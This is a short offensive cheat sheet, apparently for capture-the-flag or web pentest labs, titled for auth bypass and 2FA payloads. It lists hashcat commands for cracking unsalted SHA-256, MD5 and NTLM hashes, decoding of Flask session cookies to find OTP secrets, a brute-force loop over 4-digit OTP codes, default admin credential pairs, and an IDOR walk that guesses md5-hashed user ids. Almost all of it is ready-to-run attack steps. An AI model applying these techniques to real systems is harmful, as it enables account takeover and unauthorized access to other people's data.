# Auth Bypass & 2FA Payloads

## Unsalted Fast-Hash Cracking (do offline first)
# SHA-256 (64 hex chars)
echo '<hash>' > hash.txt
hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt
# MD5 (32 hex chars)
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# NTLM (Windows)
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt

## Flask Session Cookie (signed, NOT encrypted)
# Format: payload.timestamp.signature  (payload = base64url JSON; zlib-compressed if starts with '.')
python3 scripts/flask_session_decoder.py '<cookie>'
# OTP/secret keys to look for in the payload: otp, otp_secret, code, otp_code, token, role, admin

## OTP / 2FA Brute Force (only if no rate limit)
# 4-digit OTP space: 1000-9999 (9000 values)
for otp in range(1000, 10000):
    POST /two_fa  data={otp}
# 6-digit OTP space: 000000-999999

## Weak / Default Credentials
admin:admin
admin:password
admin:admin123

## IDOR - Hash-Obfuscated Object Reference (e.g. md5(str(id)) in profile URL)
# 1. Log in (check HTML comment for guest creds) and read YOUR id from the profile page.
# 2. Confirm scheme: md5("3000") == your profile token -> URL = /profile/user/<md5(id)>
# 3. Enumerate nearby/small IDs; 200 + admin content = win, 404 = no such user.
# See scripts/idor_enumerate.py for a reusable range walker.
MD5_IDS = [hashlib.md5(str(i).encode()).hexdigest() for i in range(1, 31)]
# Candidates when a "~20 employees" hint exists: 1..25; otherwise walk both sides of your own id.

